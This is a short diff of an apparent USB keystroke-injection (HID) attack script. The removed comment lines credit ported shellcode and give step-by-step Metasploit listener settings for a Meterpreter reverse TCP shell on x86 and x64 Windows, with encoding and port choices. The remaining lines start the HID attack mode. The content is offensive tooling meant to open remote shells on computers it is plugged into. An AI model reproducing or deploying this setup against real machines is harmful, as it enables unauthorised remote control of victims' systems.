@@ -1,15 +1,3 @@
-REM Shellcode from Cn33liz/JSMeter
-REM Ported by: SubINaclS
-REM setup listener as follows:
-REM use exploit/multi/handler
-REM  !!!! set PAYLOAD windows/x64/meterpreter/reverse_tcp <- When run from x64 version of cscript.exe
-REM  !!!! set PAYLOAD windows/meterpreter/reverse_tcp <- When run from x86 version of cscript.exe
-REM set LHOST 0.0.0.0 <- When run from x86 version of cscript.exe
-REM set LPORT 443
-REM set EnableUnicodeEncoding true
-REM set EnableStageEncoding true
-REM set ExitOnSession false
-REM exploit -j 
 REM Start exploit, going green
 LED G
 REM set attackmode to HID device
